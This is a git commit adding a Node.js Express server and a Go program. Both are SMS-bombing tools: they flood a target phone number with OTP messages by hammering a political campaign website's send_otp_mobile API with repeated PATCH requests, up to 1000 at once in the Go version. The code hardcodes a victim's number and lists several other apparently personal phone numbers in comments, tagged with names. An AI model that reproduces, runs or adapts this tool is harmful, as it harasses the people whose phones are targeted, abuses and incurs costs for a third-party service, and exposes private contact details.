d8bc538a46a7b45c985a08321a18dd69e55b1823
Shreshth Verma <verma2007s@gmail.com>
2024-05-21 12:48:25 +0530

    yes

---
+++ index.js
@@ -0,0 +1,45 @@
+const axios = require('axios');
+const qs = require('qs'); // Query string parser to format form 
+const express = require('express');
+const cors = require('cors');
+const app = express();
+
+app.use(express.json());
+app.use(cors());
+
+const spamSms = async (mobile, smsCount) => {
+  let successCount = 0;
+  let failureCount = 0;
+  const url = 'https://ekbaarphirsemodisarkar.com/api/v1/user/send_otp_mobile?language=en';
+  
+  const payload = {
+      // mobile: '8929891510' //manav
+      mobile: mobile
+  };
+
+  for (let index = 0; index < smsCount; index++) {
+    try {
+      const response = await axios.patch(url, qs.stringify(payload), {
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        }
+      });
+      console.log('Response:', response.data, mobile, index);
+      successCount++;
+    } catch (error) {
+      console.error('Error:', error);
+      failureCount++;
+    }
+  }
+  return { successCount, failureCount };
+};
+
+app.post('/spam-sms', async (req, res) => {
+  const { successCount, failureCount } = await spamSms(req.body.mobile, req.body.smsCount);
+  res.send({ successCount, failureCount });
+})
+
+app.listen(3000, () => {
+  console.log('Server is running on port 3000');
+})  
+
---
+++ ingo.go
@@ -0,0 +1,81 @@
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"net/http"
+	"net/url"
+	"sync"
+)
+
+const (
+	urlStr = "https://ekbaarphirsemodisarkar.com/api/v1/user/send_otp_mobile?language=en"
+	// urlStr = "https://github.com/animeshchaudhri"
+)
+
+var (
+	successCount int
+	failureCount int
+	mutex        sync.Mutex // Mutex to protect shared variables
+	wg           sync.WaitGroup
+)
+
+func sendRequest(mobile string) {
+	defer wg.Done()
+
+	data := url.Values{}
+	data.Set("mobile", mobile)
+
+	req, err := http.NewRequest("PATCH", urlStr, bytes.NewBufferString(data.Encode()))
+	if err != nil {
+		fmt.Println("Error creating request:", err)
+		mutex.Lock()
+		failureCount++
+		mutex.Unlock()
+		return
+	}
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("Error sending request:", err)
+		mutex.Lock()
+		failureCount++
+		mutex.Unlock()
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusOK {
+		mutex.Lock()
+		successCount++
+		mutex.Unlock()
+		fmt.Println("Response: Success")
+	} else {
+		mutex.Lock()
+		failureCount++
+		mutex.Unlock()
+		fmt.Println("Response: Failure")
+	}
+}
+
+func main() {
+	// mobile := "8929891510" //manav
+	// mobile := "8217889192"  //shakti
+	// mobile := "9816328430"  //inguz
+	mobile := "7986262805"  //mr kb
+	// mobile := "7208369027"  //random shreshth
+
+	numRequests := 1000
+	wg.Add(numRequests)
+
+	for i := 0; i < numRequests; i++ {
+		go sendRequest(mobile)
+	}
+
+	wg.Wait()
+
+	fmt.Println("Success:", successCount)
+	fmt.Println("Failure:", failureCount)
+}
